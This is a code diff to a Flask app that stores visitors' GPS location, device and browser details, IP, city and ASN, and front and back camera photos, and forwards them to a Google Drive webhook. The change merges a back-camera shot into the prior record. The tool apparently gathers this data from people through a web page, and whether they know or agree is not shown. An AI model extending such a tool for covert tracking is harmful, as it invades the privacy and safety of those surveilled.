@@ -166,6 +166,7 @@ def init_db():
             ("ip_city", "TEXT"),
             ("ip_asn", "TEXT"),
             ("camera_mode", "TEXT"),
+            ("photo_back", "TEXT"),
         ]
         for col_name, col_type in new_cols:
             if col_name not in columns:
@@ -419,19 +420,32 @@ def create_app(test_config=None):
 
         db = get_db()
         with db:
-            db.execute("""
-                INSERT INTO locations (
-                    latitude, longitude, accuracy, altitude, speed,
-                    heading, battery, device_time, received_at, photo,
-                    device_model, os, browser, screen_res, network_type,
-                    hardware, battery_charging, ip, ip_city, ip_asn, camera_mode
-                ) VALUES (
-                    :latitude, :longitude, :accuracy, :altitude, :speed,
-                    :heading, :battery, :device_time, :received_at, :photo,
-                    :device_model, :os, :browser, :screen_res, :network_type,
-                    :hardware, :battery_charging, :ip, :ip_city, :ip_asn, :camera_mode
-                )
-            """, location)
+            is_back = location.get("camera_mode") == "Kamera Belakang"
+            last_row = db.execute("SELECT id, received_at FROM locations ORDER BY id DESC LIMIT 1").fetchone()
+            merged = False
+            if is_back and last_row:
+                try:
+                    last_time = datetime.fromisoformat(last_row["received_at"])
+                    if (datetime.now(timezone.utc) - last_time).total_seconds() < 120:
+                        db.execute("UPDATE locations SET photo_back = :photo WHERE id = :id", {"photo": location.get("photo"), "id": last_row["id"]})
+                        merged = True
+                except Exception:
+                    pass
+
+            if not merged:
+                db.execute("""
+                    INSERT INTO locations (
+                        latitude, longitude, accuracy, altitude, speed,
+                        heading, battery, device_time, received_at, photo,
+                        device_model, os, browser, screen_res, network_type,
+                        hardware, battery_charging, ip, ip_city, ip_asn, camera_mode
+                    ) VALUES (
+                        :latitude, :longitude, :accuracy, :altitude, :speed,
+                        :heading, :battery, :device_time, :received_at, :photo,
+                        :device_model, :os, :browser, :screen_res, :network_type,
+                        :hardware, :battery_charging, :ip, :ip_city, :ip_asn, :camera_mode
+                    )
+                """, location)
 
         webhook_url = application.config.get("GDRIVE_WEBHOOK_URL") or os.getenv("GDRIVE_WEBHOOK_URL", "")
         if webhook_url:
